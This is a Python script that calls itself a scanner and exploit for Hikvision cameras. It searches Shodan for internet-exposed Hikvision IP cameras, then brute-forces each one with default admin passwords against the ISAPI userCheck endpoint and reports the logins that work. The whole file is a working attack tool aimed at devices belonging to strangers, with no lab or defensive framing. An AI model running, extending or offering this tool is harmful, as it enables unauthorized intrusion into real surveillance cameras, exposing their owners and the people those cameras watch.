import shodan
import argparse
import requests
import base64

def convertoToBase64(value):
    encoded_data = base64.b64encode(value.encode('utf-8'))
    return encoded_data.decode('utf-8')
def brute(ip, port):
    password = ["admin", "12345", "root"]
    user = 'admin'
    link=""
    host="http://"+ip+":"+port+"/"
    try:
        r = requests.get(host)
        link=r.url
    except:
        print("[+] "+ip+":"+port+" - Host is not ative")
        return
    for i in password:
        payload= user+':'+str(i)
        Authorizationb4 = convertoToBase64(payload)
        headers = {'User-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': '/*/',
        'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'If-Modified-Since': '0',
        'X-Requested-With': 'XMLHttpRequest',
        'Authorization': 'Basic '+str(Authorizationb4),
        'Connection': 'close'}
        req = requests.post(host+'/ISAPI/Security/userCheck', headers=headers)
        if req.status_code == 200:
            print("Found user: " + user+"-"+str(i))
        else:
            print("[+] "+user+":"+i+" - Incorrect!")



def scan(mbrute, token):
    API_KEY = token
    dork = 'Product:"Hikvision IP Camera"'
    api = shodan.Shodan(API_KEY)

    
    results = api.search(dork)
    for result in results['matches']:
        ip = result['ip_str']
        port = result['port']
        if mbrute == False:
            print("[!] Found: "+str(ip)+":"+str(port))
        else:
            print("[+] Brute force in "+ip+':'+str(port))
            brute(str(ip), str(port))
    


parser = argparse.ArgumentParser(description='Scanner and exploit for HKVision Cams')
required = parser.add_mutually_exclusive_group(required=True)
required.add_argument('-s', '--scan', action='store_true', help='Only scan hosts on the internet')
required.add_argument('-sb', '--scan-brute', action='store_true', help='Scan and brute force hosts on the internet')
parser.add_argument('-api', '--apitoken', type=str, help='Shodan API token', required=True)
args = parser.parse_args()
token = args.apitoken

if args.scan:
	scan(False, token)
else:
    scan(True, token) #scan with brute


